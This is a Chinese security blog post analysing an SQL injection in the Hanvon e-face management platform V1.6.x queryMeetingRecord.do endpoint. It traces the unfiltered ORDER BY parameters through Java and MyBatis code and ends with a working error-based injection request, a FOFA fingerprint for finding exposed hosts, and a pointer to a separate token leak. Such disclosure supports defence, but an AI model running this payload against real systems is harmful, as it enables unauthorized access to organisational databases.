---
title: "汉王e脸通综合管理平台 queryMeetingRecord.do SQL注入漏洞"
source: https://mrxn.net/jswz/hanvon-efacego-queryMeetingRecord-sqli.html
asset_dir: assets/汉王e脸通综合管理平台-querymeetingrecord.do-sql注入漏洞
---

# 汉王e脸通综合管理平台 queryMeetingRecord.do SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/8/3 08:31
- 489浏览
- [0评论](#comment)
- 52分钟阅读

深入探索

漏洞扫描服务

安全认证考试

VPN服务

---

# 漏洞简介

汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `queryMeetingRecord.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

SQL注入防护

# 影响版本

V1.6.x

# fofa语法

> icon\_hash="1380907357"

# 漏洞分析

直接看 `MobiMeetingAppController` 里关于 `queryMeetingRecord` 的实现

```
@ResponseBody
    @RequestMapping(
        value = {"/queryMeetingRecord.do"},
        method = {RequestMethod.GET}
    )
    public MethodResult queryMeetingRecord(@RequestParam(required = false,value = "page") Integer page, @RequestParam(required = false,value = "pageSize") Integer pageSize, @RequestParam(required = false,value = "start") String start, @RequestParam(required = false,value = "end") String end, @RequestParam(required = false,value = "meetingName") String meetingName, @RequestParam(required = false,value = "meetingRoom") Long meetingRoomId, @RequestParam(required = false,value = "state") Integer state, @RequestParam(required = false,value = "columnKey") String columnKey, @RequestParam(required = false,value = "order") String order, @RequestHeader(required = false,value = "token") String token) {
        new MethodResult();
        MethodResult rst = this.getTokenUser(token);
        if (rst.isSuccess()) {
            UserTpm user = (UserTpm)rst.getResult();

            MethodResult methodResult;
            try {
                if (page == null) {
                    page = Constants.DEFAULT_START_PAGE_INDEX;
                }

                if (pageSize == null) {
                    pageSize = Constants.PAGE_SIZE;
                }

                MeetingParam meetingParam = new MeetingParam();
                meetingParam.setMtName(meetingName);
                meetingParam.setMrId(meetingRoomId);
                meetingParam.setMtStartTime(start);
                meetingParam.setMtEndTime(end);
                if (state != null) {
                    meetingParam.setState(state);
                }

                meetingParam.setColumnKey(columnKey);
                meetingParam.setOrder(order);
                PageHelper.startPage(page, pageSize);
                Long id = user.getId();
                meetingParam.setUserId(id);
                List<MeetingTpm> list = this.meetingAsm.queryMeetingByEmployeeId(meetingParam);
```

深入探索

企业安全咨询

在线安全工具

SQL注入检测工具

和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 MeetingDsm.xml

代码安全审计

```
<!--个人用户查询会议室预约记录列表-->
    <select id="queryMeetingByEmployeeId" parameterType="com.hanvon.iface.tpm.meeting.param.MeetingParam"
            resultMap="ResultMapVO">
        SELECT MT.ID,MT.MT_NAME,MT.MT_DATE,MT.MT_START_TIME,MT.MT_END_TIME,MT.MT_SIGNIN_STARTTIME,
        MT.MT_SIGNIN_ENDTIME,MT.MR_ID,MT.MT_CONTENT,MT.MT_DELETE,MT.MT_STATE,MT.MT_CREATE_TIME,MT.MT_DEVICE_ID,MT_IS_SIGNIN,MT_IS_SIGNOUT,
        MT.MT_DEVICE_NAME,MT.MT_SIGNOUT_STARTTIME,MT.MT_SIGNOUT_ENDTIME,SU.SZ_NAME as applicant,sb.sz_name as
        branchName,
        MMT.MR_NAME AS MRNAME,(SELECT COUNT(1) FROM mt_meeting_file MMF WHERE MMF.MT_ID = MT.ID) AS SUM
        FROM mt_meeting MT
        LEFT JOIN mt_meeting_room MMT ON MT.MR_ID = MMT.ID
        LEFT JOIN sys_user_sys SU ON MT.MT_CREATE_ID = SU.NG_ID
        LEFT JOIN sys_branch sb on sb.ng_id = (SELECT sub.ng_branch_id from sys_user_branch sub where sub.ng_user_id
        =MT.MT_CREATE_ID )
        WHERE MT.MT_DELETE = 1 AND MT.MT_STATE=1

        <if test="keys != null">
            AND (
            SU.SZ_NAME like CONCAT('%',#{keys},'%')
            OR MT_CREATE_ID like CONCAT('%',#{keys},'%')
            )
        </if>
        <if test="state != null and state != ''">
            AND MT.MT_STATE= #{state}
        </if>
        <if test="mtName != null and mtName != ''">
            AND MT.MT_NAME like CONCAT('%',#{mtName},'%')
        </if>
        <if test="mtStartTime != null">
            AND DATE(MT.MT_DATE) &gt;= DATE(#{mtStartTime,jdbcType=VARCHAR})
            AND DATE(#{mtEndTime,jdbcType=VARCHAR}) &gt;= DATE(MT.MT_DATE)
            AND (MT.ID in (SELECT me.mt_id from mt_meeting_employee me where me.me_id=#{userId})
                  or (MT_CREATE_ID = #{userId})
            )
        </if>
        <if test="mrId != null">
            and MT.MR_ID = #{mrId}
        </if>
        <if test="mtDate != null">
            and MT.MT_DATE = #{mtDate,jdbcType=VARCHAR}
        </if>
        ORDER BY
        <if test="order == null or order == ''">
            MT.MT_CREATE_TIME desc
        </if>
        <if test="order != null and order != ''">
            ${columnKey} ${order}
        </if>
    </select>
```

用户可控的 `columnKey` 和 `order` 参数未经任何过滤直接拼接到 SQL 语句的 `ORDER BY` 子句中，导致攻击者可构造恶意输入执行任意 SQL 命令，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

> 需要一个合法的 token，参考 [wxLogin.do 信息泄露](https://mrxn.net/jswz/hanvon-efacego-wxLogin-auth-bypass-data-leak.html)获取

```
GET /manage/mobiMeetingApp/queryMeetingRecord.do?begin=&branchId=1&end=&page=1&pageSize=10&year=2025&recordId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357)) HTTP/1.1
Host: hanvon.mrxn.net
token: xxxxxx
```

[![汉王e脸通综合管理平台 queryMeetingRecord.do SQL注入漏洞](images/img-001-16332eff0aa0.webp)](https://image.mrxn.net/cbfb45e6e58e46d78ca33953413bfc1a.webp)

成功通过报错注入爆出数据库版本信息

漏洞预警服务

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
